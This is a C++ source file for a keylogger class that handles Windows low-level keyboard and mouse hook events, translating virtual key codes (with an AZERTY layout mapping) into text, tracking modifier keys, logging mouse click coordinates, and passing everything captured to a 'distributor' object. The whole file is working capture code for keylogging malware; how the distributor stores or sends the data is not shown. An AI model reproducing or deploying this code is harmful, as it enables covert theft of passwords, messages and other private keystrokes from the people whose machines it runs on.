#include "Keylogger.h"

Keylogger::Keylogger(void) {
	_maj = KeyState::KS_RELEASED;
	_shift = KeyState::KS_RELEASED;
	_lshift = KeyState::KS_RELEASED;
	_rshift = KeyState::KS_RELEASED;
	_rctrl = KeyState::KS_RELEASED;
	_ctrl = KeyState::KS_RELEASED;
	_ralt = KeyState::KS_RELEASED;
	_lctrl = KeyState::KS_RELEASED;
	_lalt = KeyState::KS_RELEASED;
	_alt = KeyState::KS_RELEASED;
}

Keylogger::~Keylogger(void) {

}

void Keylogger::init(void) {
	try {
		std::string resDir = StaticTools::GetProjectResourceDirectory();
		StaticTools::CreateFolder(resDir);

	} catch (std::runtime_error const& e) {
		StaticTools::Log << e.what() << std::endl;
	}
}

void Keylogger::keyPressed(LPKBDLLHOOKSTRUCT p) {
	std::unique_ptr<AInputType> input(new InputKeyboard);
	std::string str("");
	switch (p->vkCode) {

	case VK_BACK:*_distributor << (*input << Keylogger::key_Backspace(KeyState::KS_PRESSED)); break;
	case VK_TAB: *_distributor << (*input << "[TAB]"); break;
	case VK_CLEAR:*_distributor << (*input << "[CLEAR]"); break;
	case VK_RETURN:*_distributor << (*input << Keylogger::key_Enter(KeyState::KS_PRESSED)); break;
	case VK_SHIFT:*_distributor << (*input << Keylogger::key_Shift(KeyState::KS_PRESSED)); break;
	case VK_CONTROL:*_distributor << (*input << Keylogger::key_Ctrl(KeyState::KS_PRESSED)); break;
	case VK_MENU:*_distributor << (*input << Keylogger::key_Alt(KeyState::KS_PRESSED)); break;
	case VK_PAUSE:*_distributor << (*input << "[PAUSE]"); break;
	case VK_CAPITAL: *_distributor << (*input << Keylogger::key_Maj(KeyState::KS_PRESSED)); break;
	case VK_ESCAPE:   *_distributor << (*input << "[ESC]"); break;
	case VK_SPACE:*_distributor << (*input << " "); break;
	case VK_PRIOR:*_distributor << (*input << "[PAGE UP]"); break;
	case VK_NEXT:*_distributor << (*input << "[PAGE DOWN]"); break;
	case VK_END: *_distributor << (*input << "[END]"); break;
	case VK_HOME:*_distributor << (*input << "[HOME]"); break;
	case VK_LEFT:*_distributor << (*input << Keylogger::key_Left(KeyState::KS_PRESSED)); break;
	case VK_UP: *_distributor << (*input << Keylogger::key_Up(KeyState::KS_PRESSED)); break;
	case VK_RIGHT:*_distributor << (*input << Keylogger::key_Right(KeyState::KS_PRESSED)); break;
	case VK_DOWN:*_distributor << (*input << Keylogger::key_Down(KeyState::KS_PRESSED)); break;
	case VK_SELECT:   *_distributor << (*input << "[SELECT]"); break;
	case VK_PRINT:*_distributor << (*input << "[PRINT]"); break;
	case VK_EXECUTE: *_distributor << (*input << "[EXECUTE]"); break;
	case VK_SNAPSHOT:*_distributor << (*input << "[PRINT SCREEN]"); break;
	case VK_INSERT:   *_distributor << (*input << "[INSERT]"); break;
	case VK_DELETE:*_distributor << (*input << Keylogger::key_Delete(KeyState::KS_PRESSED)); break;
	case VK_HELP:*_distributor << (*input << "[HELP]"); break;
	case VK_LWIN:*_distributor << (*input << "[Left Windows key]"); break;
	case VK_RWIN:*_distributor << (*input << "[Right Windows key]"); break;
	case VK_APPS:*_distributor << (*input << "[Applications key]"); break;
	case VK_SLEEP:*_distributor << (*input << "[Computer Sleep key]"); break;
	case VK_NUMPAD0: *_distributor << (*input << "0"); break;
	case VK_NUMPAD1: *_distributor << (*input << "1"); break;
	case VK_NUMPAD2: *_distributor << (*input << "2"); break;
	case VK_NUMPAD3: *_distributor << (*input << "3"); break;
	case VK_NUMPAD4: *_distributor << (*input << "4"); break;
	case VK_NUMPAD5: *_distributor << (*input << "5"); break;
	case VK_NUMPAD6: *_distributor << (*input << "6"); break;
	case VK_NUMPAD7: *_distributor << (*input << "7"); break;
	case VK_NUMPAD8: *_distributor << (*input << "8"); break;
	case VK_NUMPAD9: *_distributor << (*input << "9"); break;
	case VK_MULTIPLY:*_distributor << (*input << "*"); break;
	case VK_ADD: *_distributor << (*input << "+"); break;
	case VK_SEPARATOR:*_distributor << (*input << "|"); break;
	case VK_SUBTRACT:*_distributor << (*input << "-"); break;
	case VK_DECIMAL: *_distributor << (*input << "."); break;
	case VK_DIVIDE:   *_distributor << (*input << "/"); break;
	case VK_F1:   *_distributor << (*input << "[F1]"); break;
	case VK_F2:   *_distributor << (*input << "[F2]"); break;
	case VK_F3:   *_distributor << (*input << "[F3]"); break;
	case VK_F4:   *_distributor << (*input << "[F4]"); break;
	case VK_F5:   *_distributor << (*input << "[F5]"); break;
	case VK_F6:   *_distributor << (*input << "[F6]"); break;
	case VK_F7:   *_distributor << (*input << "[F7]"); break;
	case VK_F8:   *_distributor << (*input << "[F8]"); break;
	case VK_F9:   *_distributor << (*input << "[F9]"); break;
	case VK_F10: *_distributor << (*input << "[F10]"); break;
	case VK_F11: *_distributor << (*input << "[F11]"); break;
	case VK_F12: *_distributor << (*input << "[F12]"); break;
	case VK_NUMLOCK: *_distributor << (*input << "[NUM LOCK]"); break;
	case VK_SCROLL:   *_distributor << (*input << "[SCROLL LOCK]"); break;
	case VK_LSHIFT:*_distributor << (*input << Keylogger::key_LShift(KeyState::KS_PRESSED)); break;
	case VK_RSHIFT: *_distributor << (*input << Keylogger::key_RShift(KeyState::KS_PRESSED)); break;
	case VK_LCONTROL:*_distributor << (*input << Keylogger::key_LCtrl(KeyState::KS_PRESSED)); break;
	case VK_RCONTROL:*_distributor << (*input << Keylogger::key_RCtrl(KeyState::KS_PRESSED)); break;
	case VK_LMENU:*_distributor << (*input << Keylogger::key_LAlt(KeyState::KS_PRESSED)); break;
	case VK_RMENU:*_distributor << (*input << Keylogger::key_RAlt(KeyState::KS_PRESSED)); break;
	case VK_BROWSER_BACK:*_distributor << (*input << "[Browser Back key]"); break;
	case VK_BROWSER_FORWARD: *_distributor << (*input << "[Browser Forward key]"); break;
	case VK_BROWSER_REFRESH: *_distributor << (*input << "[Browser Refresh key]"); break;
	case VK_BROWSER_STOP:*_distributor << (*input << "[Browser Stop key]"); break;
	case VK_BROWSER_SEARCH:   *_distributor << (*input << "[Browser Search key ]"); break;
	case VK_BROWSER_FAVORITES:*_distributor << (*input << "[Browser Favorites key]"); break;
	case VK_BROWSER_HOME:*_distributor << (*input << "[Browser Start and Home key]"); break;
	case VK_VOLUME_MUTE: *_distributor << (*input << "[Volume Mute key]"); break;
	case VK_VOLUME_DOWN: *_distributor << (*input << "[Volume Down key]"); break;
	case VK_VOLUME_UP:*_distributor << (*input << "[Volume Up key]"); break;
	case VK_MEDIA_NEXT_TRACK:*_distributor << (*input << "[Next Track key]"); break;
	case VK_MEDIA_PREV_TRACK:*_distributor << (*input << "[Previous Track key]"); break;
	case VK_MEDIA_STOP:   *_distributor << (*input << "[Stop Media key]"); break;
	case VK_MEDIA_PLAY_PAUSE:*_distributor << (*input << "[Play/Pause Media key]"); break;
	case VK_LAUNCH_MAIL: *_distributor << (*input << "[Start Mail key]"); break;
	case VK_LAUNCH_MEDIA_SELECT: *_distributor << (*input << "[Select Media key]"); break;
	case VK_LAUNCH_APP1: *_distributor << (*input << "[Start Application 1 key]"); break;
	case VK_LAUNCH_APP2: *_distributor << (*input << "[Start Application 2 key]"); break;
	default:
		char c = char(tolower(p->vkCode));

		if (is_alt() && is_ctrl() && is_shift())
			return;

		switch (c) {

		case 'Þ': c = '²'; break;

		case '1': c = (is_maj() ? '1' : '&');  break;
		case '2': c = ((is_alt() && is_ctrl()) ? '~' : ((is_maj()) ? '2' : 'é')); break;
		case '3': c = ((is_alt() && is_ctrl()) ? '#' : ((is_maj()) ? '3' : '"')); break;
		case '4': c = ((is_alt() && is_ctrl()) ? '{' : ((is_maj()) ? '4' : '\'')); break;
		case '5': c = ((is_alt() && is_ctrl()) ? '[' : ((is_maj()) ? '5' : '(')); break;
		case '6': c = ((is_alt() && is_ctrl()) ? '|' : ((is_maj()) ? '6' : '-')); break;
		case '7': c = ((is_alt() && is_ctrl()) ? '`' : ((is_maj()) ? '7' : 'è')); break;
		case '8': c = ((is_alt() && is_ctrl()) ? '\\' : ((is_maj()) ? '8' : '_')); break;
		case '9': c = ((is_alt() && is_ctrl()) ? '^' : ((is_maj()) ? '9' : 'ç')); break;
		case '0': c = ((is_alt() && is_ctrl()) ? '@' : ((is_maj()) ? '0' : 'à')); break;
		case 'Û': c = ((is_alt() && is_ctrl()) ? ']' : ((is_maj()) ? '°' : ')')); break;
		case '»': c = ((is_alt() && is_ctrl()) ? '}' : ((is_maj()) ? '+' : '=')); break;

		case 'Ý': c = (is_maj() ? '¨' : '^'); break;
		case 'º': c = ((is_alt() && is_ctrl()) ? '¤' : ((is_maj()) ? '£' : '$')); break;
		case 'Ü': c = (is_maj() ? 'µ' : '*'); break;

		case 'À': c = (is_maj() ? '%' : 'ù'); break;

		case '¼': c = (is_maj() ? '?' : ','); break;
		case '¾': c = (is_maj() ? '.' : ';'); break;
		case '¿': c = (is_maj() ? '/' : ':'); break;
		case 'ß': c = (is_maj() ? '§' : '!'); break;

		case 'â': c = (is_maj() ? '>' : '<'); break;
		case 'e': c = ((is_alt() && is_ctrl()) ? '€' : ((is_maj()) ? 'E' : 'e')); break;

		default:
			if (is_maj() && std::isalpha(c) && std::islower(c)) {
				c -= 32;
			}
			if (is_alt() || is_ctrl())
				return;
			break;
		}

		str.push_back(c);
		*_distributor << (*input << str);
	}
}


void Keylogger::keyReleased(LPKBDLLHOOKSTRUCT p) {
	std::unique_ptr<AInputType> input(new InputKeyboard);

	switch (p->vkCode) {
	case VK_BACK: *_distributor << (*input << Keylogger::key_Backspace(KeyState::KS_RELEASED)); break;
	case VK_RETURN: *_distributor << (*input << Keylogger::key_Enter(KeyState::KS_RELEASED)); break;
	case VK_SHIFT: *_distributor << (*input << Keylogger::key_Shift(KeyState::KS_RELEASED)); break;
	case VK_CONTROL: *_distributor << (*input << Keylogger::key_Ctrl(KeyState::KS_RELEASED)); break;
	case VK_MENU: *_distributor << (*input << Keylogger::key_Alt(KeyState::KS_RELEASED)); break;
	case VK_CAPITAL: *_distributor << (*input << Keylogger::key_Maj(KeyState::KS_RELEASED)); break;
	case VK_LEFT:  *_distributor << (*input << Keylogger::key_Left(KeyState::KS_RELEASED)); break;
	case VK_UP:  *_distributor << (*input << Keylogger::key_Up(KeyState::KS_RELEASED)); break;
	case VK_RIGHT: *_distributor << (*input << Keylogger::key_Right(KeyState::KS_RELEASED)); break;
	case VK_DOWN: *_distributor << (*input << Keylogger::key_Down(KeyState::KS_RELEASED)); break;
	case VK_DELETE: *_distributor << (*input << Keylogger::key_Delete(KeyState::KS_RELEASED)); break;
	case VK_LSHIFT: *_distributor << (*input << Keylogger::key_LShift(KeyState::KS_RELEASED)); break;
	case VK_RSHIFT:  *_distributor << (*input << Keylogger::key_RShift(KeyState::KS_RELEASED)); break;
	case VK_LCONTROL: *_distributor << (*input << Keylogger::key_LCtrl(KeyState::KS_RELEASED)); break;
	case VK_RCONTROL: *_distributor << (*input << Keylogger::key_RCtrl(KeyState::KS_RELEASED)); break;
	case VK_LMENU: *_distributor << (*input << Keylogger::key_LAlt(KeyState::KS_RELEASED)); break;
	case VK_RMENU: *_distributor << (*input << Keylogger::key_RAlt(KeyState::KS_RELEASED)); break;
	}
}

void Keylogger::mouseClick(MouseEvent me, LPMSLLHOOKSTRUCT mouse) {
	std::unique_ptr<AInputType> input(new InputMouse);
	std::string data = (me == MouseEvent::ME_Left) ? "LEFT " : "RIGHT ";

	data += std::to_string(mouse->pt.x) + ", " + std::to_string(mouse->pt.y);
	*_distributor << (*input << data);
}

void Keylogger::setDistributor(std::shared_ptr<IDistributor> distributor) {
	_distributor = distributor;
}

std::string Keylogger::key_Enter(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[ENTER]");
	return ("");
}

std::string Keylogger::key_Backspace(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[BACKSPACE]");
	return ("");
}

std::string Keylogger::key_Delete(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[DEL]");
	return ("");
}

std::string Keylogger::key_Shift(KeyState v) {
	_shift = v;
	return ("");
}

std::string Keylogger::key_LShift(KeyState v) {
	_lshift = v;
	return ("");
}

std::string Keylogger::key_RShift(KeyState v) {
	_rshift = v;
	return ("");
}

std::string Keylogger::key_LAlt(KeyState v) {
	_lalt = v;
	return ("");
}

std::string Keylogger::key_RAlt(KeyState v) {
	_ralt = v;
	return ("");
}

std::string Keylogger::key_Alt(KeyState v) {
	_alt = v;
	return ("");
}

std::string Keylogger::key_LCtrl(KeyState v) {
	_lctrl = v;
	return ("");
}

std::string Keylogger::key_RCtrl(KeyState v) {
	_rctrl = v;
	return ("");
}

std::string Keylogger::key_Ctrl(KeyState v) {
	_ctrl = v;
	return ("");
}

std::string Keylogger::key_Maj(KeyState v) {
	if (_maj == KeyState::KS_RELEASED && v == KeyState::KS_PRESSED)
		_maj = v;
	else if (_maj == KeyState::KS_PRESSED && v == KeyState::KS_PRESSED)
		_maj = KeyState::KS_RELEASED;
	return ("");
}

std::string Keylogger::key_Left(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[LEFT]");
	return ("");
}

std::string Keylogger::key_Right(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[RIGHT]");
	return ("");
}

std::string Keylogger::key_Up(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[UP]");
	return ("");
}

std::string Keylogger::key_Down(KeyState v) {
	if (v == KeyState::KS_PRESSED)
		return ("[DOWN]");
	return ("");
}

bool Keylogger::is_maj() {
	return (_maj == KeyState::KS_PRESSED || _shift == KeyState::KS_PRESSED || _lshift == KeyState::KS_PRESSED || _rshift == KeyState::KS_PRESSED || _rshift == KeyState::KS_PRESSED);
}

bool Keylogger::is_ctrl() {
	return (_ctrl == KeyState::KS_PRESSED || _rctrl == KeyState::KS_PRESSED || _lctrl == KeyState::KS_PRESSED);
}

bool Keylogger::is_alt() {
	return (_ralt == KeyState::KS_PRESSED || _lalt == KeyState::KS_PRESSED || _alt == KeyState::KS_PRESSED);
}

bool Keylogger::is_shift() {
	return (_shift == KeyState::KS_PRESSED || _lshift == KeyState::KS_PRESSED || _rshift == KeyState::KS_PRESSED || _rshift == KeyState::KS_PRESSED);
}
